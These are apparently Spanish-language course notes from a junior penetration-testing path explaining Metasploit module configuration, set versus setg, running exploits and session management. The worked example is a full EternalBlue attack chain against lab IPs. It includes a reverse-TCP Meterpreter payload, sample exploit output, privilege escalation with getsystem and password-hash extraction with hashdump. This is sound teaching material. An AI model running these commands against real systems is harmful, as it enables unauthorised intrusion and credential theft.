# ⚙️ Trabajar con Módulos en Metasploit
**Path:** Jr Penetration Tester  
**Módulo:** Metasploit — Tarea 4  
**Tema:** Configuración de parámetros, ejecución y gestión de sesiones

---

## Los 5 prompts de Metasploit — dónde estás en cada momento

Antes de configurar cualquier cosa, necesitas saber exactamente **en qué nivel del sistema estás**. Metasploit tiene cinco prompts distintos y cada uno indica un contexto diferente:

```
┌─────────────────────────────────────────────────────────────────────┐
│  LOS 5 PROMPTS DE METASPLOIT                                        │
├──────────────────────────────┬──────────────────────────────────────┤
│  root@ip-10-10-XX-XX:~#      │ Terminal normal de Linux             │
│                              │ No estás en Metasploit todavía       │
├──────────────────────────────┼──────────────────────────────────────┤
│  msf6 >                      │ msfconsole abierto                   │
│                              │ Sin módulo seleccionado              │
├──────────────────────────────┼──────────────────────────────────────┤
│  msf6 exploit(módulo) >      │ Dentro del contexto de un módulo     │
│                              │ Puedes configurar parámetros y correr│
├──────────────────────────────┼──────────────────────────────────────┤
│  meterpreter >               │ Sesión Meterpreter activa            │
│                              │ Comandos propios de Meterpreter      │
├──────────────────────────────┼──────────────────────────────────────┤
│  C:\Windows\system32>        │ Shell del sistema objetivo           │
│                              │ Comandos del OS del objetivo (cmd)   │
└──────────────────────────────┴──────────────────────────────────────┘
```

Siempre mira el prompt antes de escribir un comando — en el contexto equivocado el comando simplemente no va a funcionar o va a hacer otra cosa.

---

## Configurar parámetros con `set`

La sintaxis es siempre la misma:

```bash
set NOMBRE_PARAMETRO valor
```

### Flujo completo con EternalBlue como ejemplo

```bash
# 1. Entrar al módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Ver qué necesita
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 3. Configurar el objetivo
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.165.39
rhosts => 10.10.165.39

# 4. Verificar que quedó bien
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

![[set-rhosts-eternalblue-1.png]]

Después de cada `set`, la consola confirma el valor asignado con `parámetro => valor`. Luego con `show options` lo ves reflejado en la tabla de configuración.

### Limpiar parámetros

```bash
# Quitar el valor de un parámetro específico
unset RHOSTS

# Limpiar TODOS los parámetros del módulo actual
unset all
# → "Flushing datastore..."
```

![[unset-all-1.png]]

---

## set vs setg — parámetros locales vs globales

Esta es una de las diferencias más importantes para trabajar eficientemente:

```
set   → configura el parámetro SOLO para el módulo actual
        si cambias de módulo, el valor se pierde

setg  → configura el parámetro de forma GLOBAL
        persiste cuando cambias de módulo durante toda la sesión
```

### ¿Cuándo usar setg?

Cuando vas a trabajar con varios módulos contra el mismo objetivo. Por ejemplo: primero usas un scanner para confirmar la vulnerabilidad, luego usas el exploit. Con `setg` no tienes que escribir la IP dos veces.

```bash
# Ejemplo real del módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Configurar RHOSTS globalmente
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
rhosts => 10.10.165.39

# Salir del exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > back

# Usar un scanner auxiliar
msf6 > use auxiliary/scanner/smb/smb_ms17_010

# Show options — RHOSTS ya está configurado automáticamente
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):
   RHOSTS   10.10.165.39   yes   ...  ← ya estaba puesto
```

![[setg-ejemplo-1.png]]

```bash
# Borrar un parámetro global
unsetg RHOSTS
```

> [!warning] setg persiste durante toda la sesión
> El valor global se mantiene hasta que cierres msfconsole o uses `unsetg`. Si cambias de objetivo y olvidaste borrar el valor global, podrías lanzar módulos contra la IP equivocada sin darte cuenta. Buena práctica: usar `unsetg` al terminar con un objetivo.

---

## Parámetros que configurarás siempre

| Parámetro | Descripción | Ejemplo |
|---|---|---|
| `RHOSTS` | IP del objetivo. Acepta una IP, rango CIDR, o archivo | `set RHOSTS 10.10.10.40` |
| `RPORT` | Puerto del objetivo. Muchos módulos ya tienen un default | `set RPORT 8080` |
| `PAYLOAD` | Qué payload usar con el exploit | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` |
| `LHOST` | Tu IP — donde llegará la reverse shell | `set LHOST 10.10.44.70` |
| `LPORT` | Tu puerto de escucha | `set LPORT 4444` |
| `SESSION` | ID de sesión activa (para módulos post) | `set SESSION 2` |

> [!tip] RHOSTS con archivo de IPs
> Cuando tienes muchos objetivos, puedes pasarle un archivo de texto con una IP por línea:
> ```bash
> set RHOSTS file:/root/Desktop/targets.txt
> ```
> Metasploit iterará automáticamente sobre todas las IPs del archivo.

---

## Ejecutar el módulo

Hay dos comandos equivalentes para lanzar:

```bash
exploit    # el comando "oficial"
run        # alias de exploit, se creó porque "exploit" no tenía sentido
           # para módulos que no son exploits (scanners, auxiliares, etc.)
```

Ambos hacen exactamente lo mismo. La convención es usar `run` para auxiliares y `exploit` para exploits, pero funcionan en cualquier caso.

### exploit -z — lanzar y mandar la sesión al background

```bash
exploit -z
```

La `-z` ejecuta el exploit y, si tiene éxito, **manda la sesión resultante al background automáticamente** en lugar de conectarte a ella. Vuelves al prompt del módulo y puedes seguir trabajando.

![[exploit-z-output-1.png]]

```
[*] Started reverse TCP handler on 10.10.44.70:4444
[+] Host is likely VULNERABLE to MS17-010!
[*] Connecting to target for exploitation.
[+] ETERNALBLUE overwrite completed successfully!
[*] Sending stage (201283 bytes) to 10.10.12.229
[*] Meterpreter session 2 opened ← sesión creada
[*] Session 2 created in the background. ← y mandada al background
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

> [!tip] Leyendo el output del exploit
> Los símbolos al inicio de cada línea tienen significado:
> ```
> [*]  → Información general (lo que está pasando)
> [+]  → Éxito o resultado positivo
> [-]  → Error o fallo
> [!]  → Advertencia importante
> ```

---

## Sesiones — gestionar conexiones activas

Cada vez que un exploit tiene éxito, Metasploit crea una **sesión** — el canal de comunicación entre tu máquina y el objetivo. Puedes tener múltiples sesiones abiertas simultáneamente.

### Ver sesiones activas

```bash
# Desde cualquier contexto (incluso dentro de un módulo)
sessions

Active sessions
===============
  Id  Type                   Information                    Connection
  --  ----                   -----------                    ----------
  1   meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229
  2   meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229
```

![[sessions-list-1.png]]

Lo que muestra cada columna:

| Columna | Qué dice |
|---|---|
| `Id` | Número de la sesión — lo usas para conectarte o referenciarla |
| `Type` | Tipo de sesión (meterpreter x64/windows, shell linux, etc.) |
| `Information` | Usuario y nombre del equipo comprometido |
| `Connection` | Tu IP:puerto → IP del objetivo |

### Mandar una sesión al background

Cuando estás dentro de una sesión Meterpreter y quieres volver a msfconsole sin cerrar la conexión:

```bash
meterpreter > background
# o también:
# Ctrl+Z
```

La sesión sigue activa — solo la mandas "en pausa" al fondo.

### Conectarte a una sesión existente

```bash
# Conectarte a la sesión con ID 2
msf6 > sessions -i 2

# Vuelves al prompt de Meterpreter
meterpreter >
```

### Cerrar una sesión

```bash
# Cerrar una sesión específica
msf6 > sessions -k 2

# Cerrar todas las sesiones
msf6 > sessions -K
```

---

## El flujo completo — todo junto

Este es el workflow que usarás en la práctica, desde cero hasta sesión activa:

```bash
# ── FASE 1: Reconocimiento (opcional pero recomendado) ──────────────
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.165.39
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
# → Confirma si el objetivo es vulnerable antes de explotar

# ── FASE 2: Explotación ─────────────────────────────────────────────
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.44.70
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
# → Sesión creada y mandada al background

# ── FASE 3: Post-explotación ────────────────────────────────────────
msf6 > sessions              # ver sesiones activas
msf6 > sessions -i 1         # conectarse a la sesión
meterpreter > sysinfo        # información del sistema
meterpreter > getsystem      # intentar escalar a SYSTEM
meterpreter > hashdump       # extraer hashes de contraseñas
meterpreter > background     # volver a msfconsole

# ── FASE 4: Más post-explotación con módulos ────────────────────────
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(windows/gather/hashdump) > run
```

---

## Resumen de comandos de gestión

```
┌────────────────────────────────────────────────────────────────────┐
│  COMANDOS DE PARÁMETROS Y SESIONES                                 │
├──────────────────────────┬─────────────────────────────────────────┤
│  set PARAM valor         │ Parámetro local (solo el módulo actual) │
│  setg PARAM valor        │ Parámetro global (todos los módulos)    │
│  unset PARAM             │ Borrar parámetro local                  │
│  unset all               │ Borrar todos los parámetros locales     │
│  unsetg PARAM            │ Borrar parámetro global                 │
│  show options            │ Ver parámetros del módulo actual        │
├──────────────────────────┼─────────────────────────────────────────┤
│  exploit / run           │ Ejecutar el módulo                      │
│  exploit -z              │ Ejecutar y mandar sesión al background  │
│  check                   │ Verificar vulnerabilidad sin explotar   │
├──────────────────────────┼─────────────────────────────────────────┤
│  sessions                │ Listar sesiones activas                 │
│  sessions -i <id>        │ Conectarse a una sesión                 │
│  sessions -k <id>        │ Cerrar una sesión                       │
│  sessions -K             │ Cerrar todas las sesiones               │
│  background / Ctrl+Z     │ Mandar sesión al background             │
└──────────────────────────┴─────────────────────────────────────────┘
```

> [!success] La lógica detrás de todo esto
> Metasploit está diseñado para que puedas trabajar con múltiples objetivos y múltiples sesiones al mismo tiempo sin perder el hilo. El sistema de contextos (prompts), los parámetros locales vs globales, y la gestión de sesiones son las piezas que hacen eso posible. Una vez que entiendes el flujo — recon → exploit → sesión al background → post — el resto es saber qué módulos existen para cada tarea.
